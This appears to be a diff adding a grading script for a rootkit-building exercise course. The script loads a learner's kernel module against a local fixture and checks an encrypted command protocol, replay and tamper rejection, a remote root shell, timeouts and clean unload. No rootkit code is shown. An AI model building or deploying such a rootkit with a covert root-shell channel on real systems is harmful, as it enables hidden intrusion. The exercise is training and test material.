@@ -1,0 +1,101 @@
+#!/bin/sh
+# Check: complete rootkit, full protocol + auto-OPSEC + clean unload.
+# shellcheck source=/dev/null
+. "${RKLINGS_LIB:-/vm/checks/lib.sh}"
+
+begin "Complete rootkit: full verification"
+
+ifconfig lo 127.0.0.1 up 2>/dev/null
+
+KEY="000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"
+MARKER_DIR=/tmp/rk_fixture_p00
+rm -rf "$MARKER_DIR"
+mkdir -p "$MARKER_DIR"
+
+printf 'rootkitlings download test\n' > /tmp/rktest.txt
+
+secure_agent_fixture serve "$MARKER_DIR" 4444 127.0.0.1 "$KEY" &
+FIXTURE_PID=$!
+
+while [ ! -f "$MARKER_DIR/ready" ]; do sleep 0.1; done
+_ok "fixture listening"
+
+load rklings.ko control_key="$KEY" peer_address=127.0.0.1 peer_port=4444 shell_timeout_ms=3000
+
+_hdr "Full protocol suite"
+
+i=0; while [ ! -f "$MARKER_DIR/replay_rejected" ] && [ "$i" -lt 150 ]; do
+    sleep 0.1; i=$((i + 1))
+done
+if [ -f "$MARKER_DIR/replay_rejected" ]; then
+    _ok "command suite + replay rejection"
+else
+    _fail "command suite timed out"
+fi
+
+i=0; while [ ! -f "$MARKER_DIR/tamper_rejected" ] && [ "$i" -lt 150 ]; do
+    sleep 0.1; i=$((i + 1))
+done
+if [ -f "$MARKER_DIR/tamper_rejected" ]; then
+    _ok "tamper rejection"
+else
+    _fail "tamper rejection timed out"
+fi
+
+_hdr "SHELL"
+
+i=0; while [ ! -f "$MARKER_DIR/root_shell_complete" ] && [ "$i" -lt 200 ]; do
+    sleep 0.1; i=$((i + 1))
+done
+if [ -f "$MARKER_DIR/root_shell_complete" ]; then
+    _ok "root shell"
+else
+    _fail "root shell timed out"
+fi
+
+i=0; while [ ! -f "$MARKER_DIR/quit_complete" ] && [ "$i" -lt 100 ]; do
+    sleep 0.1; i=$((i + 1))
+done
+if [ -f "$MARKER_DIR/quit_complete" ]; then
+    _ok "QUIT"
+else
+    _fail "QUIT timed out"
+fi
+
+_hdr "Security + edge cases"
+
+i=0; while [ ! -f "$MARKER_DIR/shell_timeout" ] && [ "$i" -lt 300 ]; do
+    sleep 0.1; i=$((i + 1))
+done
+if [ -f "$MARKER_DIR/shell_timeout" ]; then
+    _ok "shell replay/tamper/refused/timeout"
+else
+    _fail "shell edge cases timed out"
+fi
+
+_hdr "Completion"
+
+i=0; while [ ! -f "$MARKER_DIR/eof" ] && [ "$i" -lt 100 ]; do
+    sleep 0.1; i=$((i + 1))
+done
+if [ -f "$MARKER_DIR/eof" ]; then
+    _ok "all phases complete"
+else
+    _fail "fixture did not complete"
+fi
+
+wait "$FIXTURE_PID" 2>/dev/null
+fixture_rc=$?
+if [ "$fixture_rc" -eq 0 ]; then
+    _ok "fixture exited cleanly"
+else
+    _fail "fixture exited with code $fixture_rc"
+fi
+
+rm -f /tmp/rktest.txt
+rm -rf "$MARKER_DIR"
+
+unload rklings
+assert_absent /sys/module/rklings
+
+summary
